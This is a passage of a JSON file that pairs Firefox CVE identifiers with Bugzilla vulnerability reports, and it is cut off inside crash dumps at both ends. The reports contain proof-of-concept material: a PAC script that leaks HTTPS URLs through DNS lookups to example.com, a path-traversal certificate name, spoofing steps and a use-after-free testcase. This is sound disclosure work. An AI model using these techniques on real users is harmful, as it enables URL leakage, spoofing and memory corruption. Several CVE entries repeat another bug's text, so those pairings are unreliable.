fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8002d280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2e8002d290: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8002d2a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c2e8002d2b0: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8002d2c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8002d2d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e8002d2e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa 0x0c2e8002d2f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2e8002d300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==24239==ABORTING"
      }
    ],
    "CVE-2017-5381": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1017616",
        "title": "\"export\" in Certificate Viewer can cause navigation to arbitrary filesystem paths",
        "description": "Date: Thu, 29 May 2014 03:35:19 +0200 From: Jann Horn <jann@thejh.net> To: security@mozilla.org Subject: Clicking \"export\" in Certificate Viewer can cause navigation to arbitrary filesystem paths -----//----- Version tested: Firefox Nightly 31.0a1 on Debian Linux 7 VULNERABILITY DETAILS On Linux, when a Certificate with slashes in the Common Name field is exported, this causes the file saving dialog to put the whole CN, including slashes, into the filename field. If the user just hits the save button, this causes the file to be saved in an attacker-chosen location on disk with an attacker-chosen filename, possibly leading to the file being interpreted as a configuration file or similar. REPRODUCTION CASE Create a self-signed cert like this: $ openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout mysitename.key -out mysitename.crt Generating a 2048 bit RSA private key ...............................+++ .....................................+++ writing new private key to 'mysitename.key' ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.', the field will be left blank. ----- Country Name (2 letter code) [AU]: State or Province Name (full name) [Some-State]: Locality Name (eg, city) []: Organization Name (eg, company) [Internet Widgits Pty Ltd]: Organizational Unit Name (eg, section) []: Common Name (e.g. server FQDN or YOUR name) []:../../../../../tmp/foobar Email Address []: First navigate to some normal https website and save its cert. Then configure a webserver to use the new cert you just created and navigate to that server. On the cert warning page, open the certificate viewer and click \"export\". You should see a \"save file\" dialog showing you the directory in which you saved the last cert with a suggested filename \"../../../../../tmp/foobar\". Click \"save\". Now there should be a new certificate file /tmp/foobar in your local filesystem. Note that there is a similar issue in Chromium, Issue 378512 - you might want to coordinate the fix with them? (Also, testing for this issue in Firefox was not my idea - I found it in Chromium, wfh@chromium.org suggested to check Firefox for the same issue.)"
      }
    ],
    "CVE-2017-5382": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1295322",
        "title": "In the newest nightly builds, its possible to capture chrome level exceptions at content level.",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0 Build ID: 20160728205137 Steps to reproduce: Used a named window and the open function combined with the feed URI preview code changes to capture a chrome level exception at content level. I know we do not want this. Actual results: A chrome level exception is captured at content level, and in this testcase is logged to the console. Expected results: It is my understanding that we do not want chrome level errors or exceptions being dispatched directly to content level."
      }
    ],
    "CVE-2017-5383": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1324716",
        "title": "Investigate handling of characters disallowed in URLs by IDNA2008",
        "description": "Bug 1323338 added U+2010 HYPHEN to the IDN blacklist. See what I said there in bug 1323338 comment 20: > > Have we implemented IDNA2008, or just some tweaks on top of IDN2003? > > according to rfc5892 \\u2010 is \"DISALLOWED\" along with the rest of that > > punctuation block (except ZWNJ and ZWJ which are CONTEXTJ). > > In http://www.unicode.org/Public/idna/latest/IdnaMappingTable.txt U+2010 is > marked as \"valid\" with the annotation \"NV8\". According to > http://www.unicode.org/reports/tr46/#Table_Data_File_Fields this means \"the > status is valid but the character is excluded by IDNA2008 from all domain > names for all versions of Unicode\". > > I think further investigation is needed to be sure how ICU's implementation > of IDNA2008 treats such characters, i.e. whether they just accept them as > valid, or whether they are setting some flag which we aren't testing for. > This covers other characters as well, as long as they don't trigger punicode > by being marked as \"restricted\" in xidmodifications.txt/, for example U+058A > ARMENIAN HYPHEN"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1323338",
        "title": "Unicode hyphens in domain names are not blacklisted",
        "description": "When used in domain names, the Unicode glyphs U+2010 (HYPHEN) and U+2011 (NON-BREAKING HYPHEN) are not converted to Punycode, thus allowing IDN homograph attacks. This is a bank: https://www.deutsche-bank.de/ This is not a bank: https://www.deutsche‐bank.de/ In my browser the characters are indistinguishable. Instead, the latter one should be displayed as \"xn--deutschebank-n09f.de\". Note that these two seem to be the only remaining instances of hyphen-confusables that don't end up as Punycode, as I checked against this list: http://unicode.org/cldr/utility/confusables.jsp?a=-&r=None"
      }
    ],
    "CVE-2017-5384": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1255474",
        "title": "Proxy Auto-Config SSL/TLS Url Disclosure",
        "description": "Description: Proxy Auto-Config SSL/TLS Url Disclosure Versions Affected: All Category: Information Disclosure Reporter: Alex Chapman and Paul Stone of Context Information Security Summary: -------- Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Firefox. The PAC file specifies a Javascript function, FindProxyForURL(url, host), which is called for each URL request in order to determine the required proxy for the connection. This function receives the full URL and hostname for both HTTP and HTTPS requests, which can be leaked by a malicious PAC script. This could expose credentials, tokens, search terms or any other data passed in HTTPS URL query strings to internet based attackers that would otherwise be encrypted. This issue does not affect the default configuration of Firefox. Analysis: --------- The PAC file is executed in a limited, sandboxed Javascript environment, but some functions are still available (see http://findproxyforurl.com/pac-functions/), most notably dnsResolve. This allows for the full request URL from affected clients to be leaked to an attacker's DNS server or local network hosts via LLMNR. Since PAC files must be specified manually (either in Firefox or in the system proxy settings), this issue would require a network-based attacker to be able to intercept network traffic of a client configured with a PAC file. For example, this could be performed by a malicious gateway. All software that implements the PAC specification as written is affected by this issue. We have has confirmed this issue in a number of browsers and operating systems. Notably however, Internet Explorer does not leak full URLs, instead passing only the protocol and hostname to the 'url' parameter of FindProxyForURL (e.g. https://www.example.com/, not https://www.example.com/index.html?foo=bar). Therefore a possible fix for this issues is to follow this same behaviour. Proof of Concept: ----------------- A PAC script can be crafted, as below, which will perform a DNS lookup based on the host and url parameters passed into the function: function FindProxyForURL(url, host){{ if (dnsResolve((url+'.example.com').replace(/[^a-z0-9_-]+/gi,'.'))) return \"DIRECT\"; return \"DIRECT\"; }} This will perform DNS lookups with the encoded URLs against the example.com DNS server. See the following example DNS captures from HTTPS requests: https.incoming.telemetry.mozilla.org.submit.telemetry.0b2fe929-bff9-4421-9a77-9247930853db.main.Firefox.44.0.2.release.20160210153822.v.4.example.com. https.www.google.com.complete.search.client.firefox.q.secre.example.com. https.www.google.com.complete.search.client.firefox.q.secret.example.com."
      }
    ],
    "CVE-2017-5385": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1295945",
        "title": "HTML documents sent with multipart/x-mixed-replace ignores Referrer-Policy response header",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7 Steps to reproduce: Following two URLs return a HTML document with \"Referrer-Policy no-referrer\" in a response header. #1. MIME: text/html http://mallory.csrf.jp/x-mixed-replace/referrer/index.html #2. MIME: multipart/x-mixed-replace http://mallory.csrf.jp/x-mixed-replace/referrer/bad.php The hyperlink in #1 sends no REFERER header but the hyperlink in #2 sends REFERER. Actual results: This means that a HTML document sent with multipart/x-mixed-replace ignores Referrer-Policy response header. This can be a cause of sensitive information leakage. Expected results: Referrer-Policy header should be applied to documents with multipart/x-mixed-replace."
      }
    ],
    "CVE-2017-5392": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1293709",
        "title": "nsWindow::LayerViewSupport's weak reference used on multiple threads",
        "description": "Based on bug 956338, see https://treeherder.mozilla.org/#/jobs?repo=try&revision=cfc312760e8c4c6103e05b80db1b192d64fe337b for android, log: https://treeherder.mozilla.org/logviewer.html#?job_id=25388610&repo=try#L1704 Weak references are not thread safe. 09:35:44 INFO - 0 libxul.so!mozilla::detail::WeakReference<nsWindow::GeckoViewSupport>::get [WeakPtr.h:cfc312760e8c : 137 + 0x0] 09:35:44 INFO - r0 = 0x5d7dd7d7 r1 = 0x96b33039 r2 = 0x96b33039 r3 = 0x5df31f08 09:35:44 INFO - r4 = 0x00000000 r5 = 0x61e24b60 r6 = 0x2a2964b0 r7 = 0x62bff498 09:35:44 INFO - r8 = 0x62bff4a8 r9 = 0x5347cedc r10 = 0x2a295de0 r12 = 0x00000003 09:35:44 INFO - fp = 0x62bff4bc sp = 0x62bff430 lr = 0x5cb4c86b pc = 0x5cb4c86a 09:35:44 INFO - Found by: given as instruction pointer in context 09:35:44 INFO - 1 libxul.so!mozilla::jni::detail::NativePtr<nsWindow::LayerViewSupport, true>::Get<mozilla::jni::LocalRef<mozilla::java::LayerView::Compositor> > [WeakPtr.h:cfc312760e8c : 246 + 0x5] 09:35:44 INFO - r4 = 0x4c7a3f78 r5 = 0x2a2964b0 r6 = 0x2a2964b0 r7 = 0x62bff498 09:35:44 INFO - r8 = 0x62bff4a8 r9 = 0x5347cedc r10 = 0x2a295de0 fp = 0x62bff4bc 09:35:44 INFO - sp = 0x62bff448 pc = 0x5cb4f7c3 09:35:44 INFO - Found by: call frame info 09:35:44 INFO - 2 libxul.so!mozilla::jni::detail::ProxyNativeCall<nsWindow::LayerViewSupport, mozilla::java::LayerView::Compositor, false, false>::operator() [Natives.h:cfc312760e8c : 345 + 0x5] 09:35:44 INFO - r3 = 0x0000001a r4 = 0x4c7a3f78 r5 = 0x62bff490 r6 = 0x2a2964b0 09:35:44 INFO - r7 = 0x62bff498 r8 = 0x62bff4a8 r9 = 0x5347cedc r10 = 0x2a295de0 09:35:44 INFO - fp = 0x62bff4bc sp = 0x62bff458 pc = 0x5cb4f805 09:35:44 INFO - Found by: call frame info 09:35:44 INFO - 3 libxul.so!nsWindow::LayerViewSupport::OnNativeCall<mozilla::jni::detail::ProxyNativeCall<nsWindow::LayerViewSupport, mozilla::java::LayerView::Compositor, false, false> > [nsWindow.cpp:cfc312760e8c : 958 + 0x5] 09:35:44 INFO - r4 = 0x4c7a3f78 r5 = 0x62bff490 r6 = 0x00000000 r7 = 0x5347cee4 09:35:44 INFO - r8 = 0x62bff4a8 r9 = 0x5347cedc r10 = 0x2a295de0 fp = 0x62bff4bc 09:35:44 INFO - sp = 0x62bff478 pc = 0x5cb4f88f 09:35:44 INFO - Found by: call frame info 09:35:44 INFO - 4 libxul.so!mozilla::jni::detail::NativeStubImpl<mozilla::java::LayerView::Compositor::SyncInvalidateAndScheduleComposite_t, nsWindow::LayerViewSupport, mozilla::jni::Args<>, false, true>::Wrap<&nsWindow::LayerViewSupport::SyncInvalidateAndScheduleComposite> [Natives.h:cfc312760e8c : 412 + 0x5] 09:35:44 INFO - r4 = 0x4c7a3f78 r5 = 0x2a295dd0 r6 = 0x00000000 r7 = 0x5347cee4 09:35:44 INFO - r8 = 0x62bff4a8 r9 = 0x5347cedc r10 = 0x2a295de0 fp = 0x62bff4bc 09:35:44 INFO - sp = 0x62bff490 pc = 0x5cb4f979 09:35:44 INFO - Found by: call frame info stack not copied completely, see the log."
      }
    ],
    "CVE-2017-5393": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1309282",
        "description": "Based on bug 956338, see https://treeherder.mozilla.org/#/jobs?repo=try&revision=cfc312760e8c4c6103e05b80db1b192d64fe337b for android, log: https://treeherder.mozilla.org/logviewer.html#?job_id=25388610&repo=try#L1704 Weak references are not thread safe. 09:35:44 INFO - 0 libxul.so!mozilla::detail::WeakReference<nsWindow::GeckoViewSupport>::get [WeakPtr.h:cfc312760e8c : 137 + 0x0] 09:35:44 INFO - r0 = 0x5d7dd7d7 r1 = 0x96b33039 r2 = 0x96b33039 r3 = 0x5df31f08 09:35:44 INFO - r4 = 0x00000000 r5 = 0x61e24b60 r6 = 0x2a2964b0 r7 = 0x62bff498 09:35:44 INFO - r8 = 0x62bff4a8 r9 = 0x5347cedc r10 = 0x2a295de0 r12 = 0x00000003 09:35:44 INFO - fp = 0x62bff4bc sp = 0x62bff430 lr = 0x5cb4c86b pc = 0x5cb4c86a 09:35:44 INFO - Found by: given as instruction pointer in context 09:35:44 INFO - 1 libxul.so!mozilla::jni::detail::NativePtr<nsWindow::LayerViewSupport, true>::Get<mozilla::jni::LocalRef<mozilla::java::LayerView::Compositor> > [WeakPtr.h:cfc312760e8c : 246 + 0x5] 09:35:44 INFO - r4 = 0x4c7a3f78 r5 = 0x2a2964b0 r6 = 0x2a2964b0 r7 = 0x62bff498 09:35:44 INFO - r8 = 0x62bff4a8 r9 = 0x5347cedc r10 = 0x2a295de0 fp = 0x62bff4bc 09:35:44 INFO - sp = 0x62bff448 pc = 0x5cb4f7c3 09:35:44 INFO - Found by: call frame info 09:35:44 INFO - 2 libxul.so!mozilla::jni::detail::ProxyNativeCall<nsWindow::LayerViewSupport, mozilla::java::LayerView::Compositor, false, false>::operator() [Natives.h:cfc312760e8c : 345 + 0x5] 09:35:44 INFO - r3 = 0x0000001a r4 = 0x4c7a3f78 r5 = 0x62bff490 r6 = 0x2a2964b0 09:35:44 INFO - r7 = 0x62bff498 r8 = 0x62bff4a8 r9 = 0x5347cedc r10 = 0x2a295de0 09:35:44 INFO - fp = 0x62bff4bc sp = 0x62bff458 pc = 0x5cb4f805 09:35:44 INFO - Found by: call frame info 09:35:44 INFO - 3 libxul.so!nsWindow::LayerViewSupport::OnNativeCall<mozilla::jni::detail::ProxyNativeCall<nsWindow::LayerViewSupport, mozilla::java::LayerView::Compositor, false, false> > [nsWindow.cpp:cfc312760e8c : 958 + 0x5] 09:35:44 INFO - r4 = 0x4c7a3f78 r5 = 0x62bff490 r6 = 0x00000000 r7 = 0x5347cee4 09:35:44 INFO - r8 = 0x62bff4a8 r9 = 0x5347cedc r10 = 0x2a295de0 fp = 0x62bff4bc 09:35:44 INFO - sp = 0x62bff478 pc = 0x5cb4f88f 09:35:44 INFO - Found by: call frame info 09:35:44 INFO - 4 libxul.so!mozilla::jni::detail::NativeStubImpl<mozilla::java::LayerView::Compositor::SyncInvalidateAndScheduleComposite_t, nsWindow::LayerViewSupport, mozilla::jni::Args<>, false, true>::Wrap<&nsWindow::LayerViewSupport::SyncInvalidateAndScheduleComposite> [Natives.h:cfc312760e8c : 412 + 0x5] 09:35:44 INFO - r4 = 0x4c7a3f78 r5 = 0x2a295dd0 r6 = 0x00000000 r7 = 0x5347cee4 09:35:44 INFO - r8 = 0x62bff4a8 r9 = 0x5347cedc r10 = 0x2a295de0 fp = 0x62bff4bc 09:35:44 INFO - sp = 0x62bff490 pc = 0x5cb4f979 09:35:44 INFO - Found by: call frame info stack not copied completely, see the log."
      }
    ],
    "CVE-2017-5394": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1222798",
        "title": "Firefox 43 for Android : Clickjacking / CSRF attacks and Location Bar Spoofing (URL and SSL Spoofing)",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0 Build ID: 20151029151421 Steps to reproduce: With Firefox 42 for Android , it's possible to make Clickjacking /CSRF attacks and possible URL and SSL Spoofing. Step1 : go to https://www.alternativ-testing.fr/Research/Mozilla/android/android-Firefox42.0-Clickjacking-CSRF-URL-and-SSL%20Spoofing/testfs.html and click on the step1 link. Step2 : click on the step2 Link. step3 : an alert() JavaScript Function will be used for redirect the user on the tab opened by the first link (step1 link) and the location bar will appears like a secure webpage and show \"https://mobile.twitter.com/session/new\" but the visible content of the webpage is the content of \"https://www.alternativ-testing.fr/Research/Mozilla/android/android-Firefox42.0-Clickjacking-CSRF-URL-and-SSL%20Spoofing/testfs.html\" if your login and password for mobile.twitter.com is registred , by clicking on the button \"ClickJack-twitter-login\" you will be connected on your twitter account ( i will uploaded you a video and a screenshot for show you what this vulnerability is exactly) Actual results: An attacker can use this vulnerability for make clickjacking /CSRF attacks and possibly URL ans SSL Spoofing. Expected results: The visible content of the webpage is wrong and the real content of the URL showed is invisible and this can lead to ClickJacking and Cross-Site Request Forgery and also possible URL ans SSL Spoofing."
      }
    ],
    "CVE-2017-5395": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1293463",
        "title": "Firefox for Android: Location Bar Spoofing Risk - The Location Bar remains hidden when the user manually scrolls down a webpage and another website is loaded during this scroll event",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0 Build ID: 20160726073904 Steps to reproduce: [A demonstration video will be uploaded to show you the malicious result of this security bug] ----- Step1 : Go to http://www.alternativ-testing.fr/Research/Mozilla/android/~F5g9M-Addressbar-Spoofing-j3U7k~/index-start.html ----- Step2 : Go down into this webpage (the location bar disappears) , during this event a malicious webpage which is slow to load will start its loading without that the Location Bar shows its web address (and the Location Bar remains hidden). (During the slow loading of the malicious website, a link specially crafted can be clicked). <!>Step2 INFO : The loading time of the malicious webpage is 9 seconds when you go on the testcase link ( http://www.alternativ-testing.fr/Research/Mozilla/android/~F5g9M-Addressbar-Spoofing-j3U7k~/index-start.html ) but can be changed by a bigger loading time. (The PHP code of the \"redirect-and-sleep().php\" can be changed by a bigger or smaller loading time).<!> ----- Step3 : After going down into the webpage \"index-start.html\", the user can click on the link \"https://www.google.fr\" (before the loading of the malicious webpage which is 9 seconds ) or wait the loading of the malicious website after the scrolling down. ----- Actual results: A faked Location Bar is shown instead the true location bar which remains hidden. When you go on a webpage specially crafted which uses a slow loading to a malicious webpage/website during you scroll down into this first webpage, the Location Bar disappears (even if another website/webpage is loaded), if an user clicks on a link which hasn't effect (crafted specially to mislead the user which thinks that the link goes on the website indicated or of its choice) the Location Bar is always invisible when the malicious Webpage is loaded and this malicious webpage contains a faked Location Bar leading to a Location Bar URL / SSL Spoofing Risk. Expected results: The Location Bar should reappear and be always visible when another webpage is loaded but it is not the case for this security bug. When a webpage is slowly loaded by another webpage, and even if you go down on this webpage (manually scroll down) and that the Location Bar disappears , The Location Bar should be normally visible when another webpage is loaded. The Location Bar should be always visible when another website or another webpage is loaded."
      }
    ],
    "CVE-2017-5396": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1329403",
        "title": "BaseMediaResource::ModifyLoadFlags Use-After-Free using MP4 video.",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0 SeaMonkey/2.46 Build ID: 20161229190117 Steps to reproduce: Download the attached mp4 video file and create an iframe tag with the src pointing to it, then removing the iframe nodes and doing a document.write in the main window right after can cause the media resource chanel used to download the mp4 to be freed and reused in a short time inside this new document. It doesn't crash if using timers or events so I had to wait in an alert or sync XMLHttpRequestt for the object deletion, apparently as stated here https://dxr.mozilla.org/mozilla-central/source/dom/media/MediaResource.h#438, it can only be accessed from the main thread. I'm reproducing it waiting 10 seconds before closing the alert, it's an arbitrary time. The basic idea is that it only continues execution after a call to MediaResource::Destroy(). Using the testcase it only crashes using mp4 files. Tested with a Nightly build 32bit version: Name Firefox Version 53.0a1 Build ID 20161201030205 Actual results: (910.da0): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=e5e5e5e5 ebx=00000001 ecx=8374b9ee edx=00000015 esi=1786c02c edi=176dac40 eip=69fe630a esp=003bf0dc ebp=003bf0f8 iopl=0 nv up ei pl zr na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010246 xul!mozilla::BaseMediaResource::ModifyLoadFlags+0x5e: 69fe630a 8b08 mov ecx,dword ptr [eax] ds:002b:e5e5e5e5=???????? 69fe630c ff5130 call dword ptr [ecx+30h]"
      }
    ],
    "CVE-2017-5398": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1332550%2C1332597%2C1338383%2C1321612%2C1322971%2C1333568%2C1333887%2C1335450%2C1325052%2C1324379%2C1336510",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0 SeaMonkey/2.46 Build ID: 20161229190117 Steps to reproduce: Download the attached mp4 video file and create an iframe tag with the src pointing to it, then removing the iframe nodes and doing a document.write in the main window right after can cause the media resource chanel used to download the mp4 to be freed and reused in a short time inside this new document. It doesn't crash if using timers or events so I had to wait in an alert or sync XMLHttpRequestt for the object deletion, apparently as stated here https://dxr.mozilla.org/mozilla-central/source/dom/media/MediaResource.h#438, it can only be accessed from the main thread. I'm reproducing it waiting 10 seconds before closing the alert, it's an arbitrary time. The basic idea is that it only continues execution after a call to MediaResource::Destroy(). Using the testcase it only crashes using mp4 files. Tested with a Nightly build 32bit version: Name Firefox Version 53.0a1 Build ID 20161201030205 Actual results: (910.da0): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=e5e5e5e5 ebx=00000001 ecx=8374b9ee edx=00000015 esi=1786c02c edi=176dac40 eip=69fe630a esp=003bf0dc ebp=003bf0f8 iopl=0 nv up ei pl zr na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010246 xul!mozilla::BaseMediaResource::ModifyLoadFlags+0x5e: 69fe630a 8b08 mov ecx,dword ptr [eax] ds:002b:e5e5e5e5=???????? 69fe630c ff5130 call dword ptr [ecx+30h]"
      }
    ],
    "CVE-2017-5399": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1332569%2C1315248%2C1261335%2C1321038%2C1331771%2C1339566%2C1339591%2C1240893%2C1341905%2C1323241%2C1336467%2C1270288%2C1295299%2C1296024%2C1304201%2C1306142%2C1307557%2C1308036%2C1334246%2C1334290%2C1317085%2C1339116%2C1324000%2C1323150%2C1332501%2C1320894%2C1333752%2C1303713%2C1321566%2C1264053%2C1343513",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0 SeaMonkey/2.46 Build ID: 20161229190117 Steps to reproduce: Download the attached mp4 video file and create an iframe tag with the src pointing to it, then removing the iframe nodes and doing a document.write in the main window right after can cause the media resource chanel used to download the mp4 to be freed and reused in a short time inside this new document. It doesn't crash if using timers or events so I had to wait in an alert or sync XMLHttpRequestt for the object deletion, apparently as stated here https://dxr.mozilla.org/mozilla-central/source/dom/media/MediaResource.h#438, it can only be accessed from the main thread. I'm reproducing it waiting 10 seconds before closing the alert, it's an arbitrary time. The basic idea is that it only continues execution after a call to MediaResource::Destroy(). Using the testcase it only crashes using mp4 files. Tested with a Nightly build 32bit version: Name Firefox Version 53.0a1 Build ID 20161201030205 Actual results: (910.da0): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=e5e5e5e5 ebx=00000001 ecx=8374b9ee edx=00000015 esi=1786c02c edi=176dac40 eip=69fe630a esp=003bf0dc ebp=003bf0f8 iopl=0 nv up ei pl zr na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010246 xul!mozilla::BaseMediaResource::ModifyLoadFlags+0x5e: 69fe630a 8b08 mov ecx,dword ptr [eax] ds:002b:e5e5e5e5=???????? 69fe630c ff5130 call dword ptr [ecx+30h]"
      }
    ],
    "CVE-2017-5400": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1334933",
        "title": "targeted ASM.JS JIT-Spray allows bypassing ASLR and DEP",
        "description": "Dear Mozilla Team, The mitigations made against bug 1325200 can be circumvented, and hence, ASM.JS JIT-Spray in combination with heap spray still allows to fully bypass ASLR and DEP in 32-bit Firefox on Windows. An attacker can directly jump to his controlled machine code without resorting to memory-disclosures/info-leaks and code reuse, when exploiting a memory corruption vulnerability. As stated in comment #52 of bug 1325200, the attacker first occupies many memory regions to decrease the entropy of possible 64KB aligned base addresses and then forces the creation of max. allowed ASM.JS code regions. As shown in the PoC, his controlled machine code lands at predictable addresses. (Can you reproduce?) I think the best mitigations are 1) random nop insertion and 2) constant blinding of four-byte constants: 1) Inserting different-sized nop-like instructions (such as \"lea esp, [esp]\" and \"nop dword [REG32 + OFFSET]\") at random locations into the stream of machine code instructions decreases the possiblilty to hit a sprayed nop sled. Therefore, each JIT module should have different random nops. Even if the attacker hits a nop sled, the instruction stream may \"re-synchronize\" and his payload becomes unusable. 2) If four-byte constants are blinded only two(/one)-byte constants can be used to hide attacker-controlled machine instructions. However, in combination with 1) I doubt that an attacker can do anything meaningful with that. Of course both mitigations may have an unacceptable performance overhead :/. Still, I hope this helps. If you need more information, please let me know. Best, Rh0 P.S.: If requested I can provide a PoC with more code execution (.e.g.: WinExec(\"cmd\")) soon."
      }
    ],
    "CVE-2017-5402": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1334876",
        "title": "heap-use-after-free in mozilla::dom::FontFaceSet::DispatchLoadingFinishedEvent",
        "description": "The following testcase crashes the latest ASAN build of Firefox. <script> function start() { o5=document.createElement('canvas').getContext('2d'); o78=document.createElement('style'); o79=document.createTextNode(\"@font-face{ font-family: font0; src: url('a') format('eot'\"); o78.appendChild(o79); document.documentElement.appendChild(o78); o118=document.fonts; o132=document.createElement('style'); document.documentElement.appendChild(o132); o118.onloadingdone=fun1; o5.font=' smaller font0'; o5.fillText(\"a\",10,10); o221=document.createElement('iframe'); document.documentElement.appendChild(o221); o264=document.createRange(); o264.selectNode(o132); } function fun1() { try{o264.surroundContents(o79);}catch(E){} document.documentElement.offsetHeight; fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ================================================================= ==25681==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d00004a2a8 at pc 0x7f6ced5e7ee1 bp 0x7ffdb0fbae00 sp 0x7ffdb0fbadf8 READ of size 8 at 0x60d00004a2a8 thread T0 (Web Content) #0 0x7f6ced5e7ee0 in GetThread /home/worker/workspace/build/src/obj-firefox/dist/include/nsISupportsImpl.h:58:36 #1 0x7f6ced5e7ee0 in AddRef /home/worker/workspace/build/src/layout/style/FontFace.cpp:98 #2 0x7f6ced5e7ee0 in AddRef /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:37 #3 0x7f6ced5e7ee0 in AddRef /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:391 #4 0x7f6ced5e7ee0 in RefPtr<mozilla::dom::FontFace>::assign_with_AddRef(mozilla::dom::FontFace*) /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:54 #5 0x7f6ced5e323a in operator= /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:191:5 #6 0x7f6ced5e323a in init<mozilla::dom::FontFace *&> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/OwningNonNull.h:147 #7 0x7f6ced5e323a in operator= /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/OwningNonNull.h:69 #8 0x7f6ced5e323a in mozilla::dom::FontFaceSet::DispatchLoadingFinishedEvent(nsAString_internal const&, nsTArray<mozilla::dom::FontFace*> const&) /home/worker/workspace/build/src/layout/style/FontFaceSet.cpp:1657 #9 0x7f6ced5d802a in mozilla::dom::FontFaceSet::CheckLoadingFinished() /home/worker/workspace/build/src/layout/style/FontFaceSet.cpp:1641:5 #10 0x7f6ced906279 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1874:11 #11 0x7f6ced913d75 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:295:7 #12 0x7f6ced913a44 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:317:5 #13 0x7f6ced915a84 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:506:9 #14 0x7f6cee189084 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:64:5 #15 0x7f6ce82aa407 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:160:20 #16 0x7f6ce7f1ec37 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1425:16 #17 0x7f6ce7e656d0 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1781:14 #18 0x7f6ce7e61c0c in 